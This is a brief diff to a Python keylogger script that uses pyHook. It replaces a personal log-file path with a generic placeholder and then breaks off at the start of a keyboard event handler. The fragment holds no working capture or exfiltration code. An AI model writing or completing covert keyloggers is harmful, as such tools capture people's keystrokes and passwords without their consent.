@@ -1,5 +1,5 @@
 import pyHook, pythoncom, sys, logging
-advancedLog="C:\\Bogdan's Folder\\#PROGRAMMING\\WORK\\#PROJECTS\\CODING\\PYTHON PROJECTS\\Keylogger\\Keylogger Advanced 1.0\\advanced_log.txt"
+advancedLog="C:\\path\\advanced_log.txt"
 
 def OnKeyboardEvent(event):
     
